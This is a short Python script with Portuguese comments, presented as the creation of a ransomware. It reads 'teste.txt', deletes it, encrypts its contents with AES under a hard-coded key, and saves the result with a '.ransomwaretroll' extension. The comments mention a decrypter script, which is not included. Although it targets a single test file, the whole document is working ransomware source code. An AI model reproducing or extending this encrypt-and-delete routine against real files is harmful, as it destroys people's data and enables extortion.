##Criação de um ransomware em python.
##Para roda-lo, inicie o encrypter. 
##Logo após iniciar o encrypter.py, o teste.txt passará a se chamar teste.txt.ransonwaretroll
##o teste.txt fica ilegivel
##rodando o decrypter.py, o teste.txt volta para o estado inicial

import os
import pyaes

##abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

##remover o arquivo
os.remove(file_name)

##chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

##criptografar o arquivo
crypto_data = aes.encrypt(file_data)

##salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
